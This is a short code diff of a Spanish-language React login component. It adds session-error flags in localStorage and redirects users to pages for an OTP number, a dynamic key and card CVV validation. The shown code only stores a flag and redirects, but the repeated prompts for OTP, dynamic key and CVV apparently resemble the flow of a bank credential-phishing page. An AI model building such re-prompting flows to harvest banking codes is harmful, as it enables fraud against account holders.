@@ -568,12 +568,18 @@ export default function IniciarSesion() {
           break;
         case 'error_otp':
 
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
+
           // Redirige a la página
           redirigir(`/numero-otp`);
 
           // Se sale del switch
           break;
         case 'error_din':
+
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
 
           // Redirige a la página
           redirigir(`/clave-dinamica`);
@@ -622,10 +628,12 @@ export default function IniciarSesion() {
 
           // Se sale del switch
           break;
-
         case 'error_cvv_custom':
+
           // Redirige a validación con error
           redirigir(`/validacion-cvv?error=true`);
+
+          // Se sale del switch
           break;
         default:
 
